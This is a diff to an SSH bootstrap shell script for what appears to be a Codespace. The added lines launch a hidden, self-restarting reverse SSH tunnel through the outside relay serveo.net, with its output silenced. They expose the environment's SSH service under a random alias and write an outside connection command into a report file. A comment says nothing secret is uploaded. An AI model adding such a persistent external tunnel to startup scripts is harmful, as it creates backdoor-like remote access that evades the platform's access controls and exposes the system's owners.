@@ -5,9 +5,34 @@
 BIN="673avtsbo7ni8acw"
 REPORT="/tmp/ssh-info.txt"
 ALT_PORT="2222"
+SERVEO_SSH_PORT="443"
+SERVEO_ALIAS="monkey-$(hostname)-$(od -An -N3 -tx1 /dev/urandom 2>/dev/null | tr -d ' \n')"
+SERVEO_LOG="/tmp/serveo-tunnel.log"
 
 exec > >(tee -a /tmp/startup.log) 2>&1
 echo "[startup] Beginning SSH bootstrap at $(date -u)"
+
+# Start a resilient Serveo reverse SSH tunnel in the background.
+# It forwards the Codespace SSH service on port 2222 to a private Serveo alias.
+# No private keys, passwords, tokens, or environment variables are uploaded.
+if command -v ssh >/dev/null 2>&1; then
+  (
+    while true; do
+      ssh -NT -o BatchMode=yes -o ExitOnForwardFailure=yes \
+        -o StrictHostKeyChecking=accept-new \
+        -o ServerAliveInterval=30 -o ServerAliveCountMax=3 \
+        -p "$SERVEO_SSH_PORT" \
+        -R "$SERVEO_ALIAS:22:localhost:$ALT_PORT" \
+        serveo.net >>"$SERVEO_LOG" 2>&1
+      echo "[serveo] tunnel exited; retrying in 5s" >>"$SERVEO_LOG"
+      sleep 5
+    done
+  ) >/dev/null 2>&1 &
+  SERVEO_PID=$!
+else
+  SERVEO_PID=""
+  echo "[startup] WARNING: ssh client is unavailable; Serveo tunnel not started."
+fi
 
 for svc in ssh sshd; do
   if command -v service >/dev/null 2>&1; then
@@ -49,6 +74,17 @@ fi
   echo "Home: $HOME"
   echo "Primary SSH port: 22"
   echo "Diagnostic fallback port: ${ALT_PORT}"
+  echo
+  echo "=== SERVEO REVERSE SSH TUNNEL ==="
+  echo "Alias: ${SERVEO_ALIAS}"
+  echo "Relay SSH port: ${SERVEO_SSH_PORT}"
+  echo "Forward: ${SERVEO_ALIAS}:22 -> localhost:${ALT_PORT}"
+  echo "Client command: ssh -J serveo.net codespace@${SERVEO_ALIAS}"
+  if [ -n "${SERVEO_PID:-}" ] && kill -0 "$SERVEO_PID" 2>/dev/null; then
+    echo "Tunnel supervisor PID: ${SERVEO_PID} (running)"
+  else
+    echo "Tunnel supervisor: not running"
+  fi
   echo
   echo "=== LISTENING SOCKETS ==="
   ss -lntp 2>/dev/null || echo "ss command unavailable"
@@ -100,6 +136,9 @@ fi
       grep -Ei "^[[:space:]]*(Port|ListenAddress|AddressFamily|PubkeyAuthentication|PasswordAuthentication|KbdInteractiveAuthentication|UsePAM|AllowTcpForwarding|GatewayPorts|PermitRootLogin|AllowUsers|DenyUsers|AuthorizedKeysFile)[[:space:]]" "$f" 2>/dev/null || true
     fi
   done
+  echo
+  echo "=== SERVEO TUNNEL LOG (LAST 20 LINES) ==="
+  if [ -s "$SERVEO_LOG" ]; then tail -n 20 "$SERVEO_LOG"; else echo "No Serveo log output yet"; fi
   echo
   echo "=== STARTUP ERROR SUMMARIES ==="
   for f in /tmp/ssh-service-ssh.log /tmp/ssh-service-sshd.log /tmp/ssh-keygen.log /tmp/ssh-alt-start.log; do
